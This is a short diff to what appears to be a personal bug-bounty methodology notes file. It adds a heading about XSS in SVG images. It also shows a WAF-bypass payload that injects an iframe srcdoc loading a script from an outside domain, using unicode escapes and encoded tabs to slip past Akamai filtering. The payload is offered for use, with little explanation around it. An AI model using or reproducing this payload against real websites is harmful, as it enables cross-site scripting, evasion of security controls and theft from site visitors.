@@ -1,3 +1,7 @@
+#### XSS in SVG image 
+![image](https://github.com/Sameer484/methodology/assets/110039044/e40a3018-7707-457b-a054-bf3bb3832674)
+
+
 ##### If there is reflected value in the iframe src but akamai blocks it, we can try to bypass it using below payload
 ````
 link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
